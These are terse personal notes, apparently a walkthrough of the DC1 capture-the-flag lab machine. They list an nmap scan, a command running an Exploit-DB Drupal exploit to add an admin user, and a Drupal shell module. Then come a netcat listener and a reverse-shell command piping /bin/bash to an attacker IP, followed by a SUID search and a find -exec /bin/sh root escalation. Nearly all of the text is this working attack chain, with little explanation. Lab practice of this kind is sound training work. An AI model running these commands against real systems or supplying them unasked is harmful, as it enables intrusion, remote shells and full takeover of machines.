----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# DC1
# 25/1/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind

drupal is vulnerable
python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -u shub -p shub -t http://192.168.143.193/


then add module for shell
https://www.drupal.org/project/shell/releases/7.x-1.0-beta5


nc -lvnp 6969  
nc -nv 192.168.49.143 6969 -e /bin/bash


find / -perm -u=s -type f 2>/dev/null
find . -exec '/bin/sh' \;
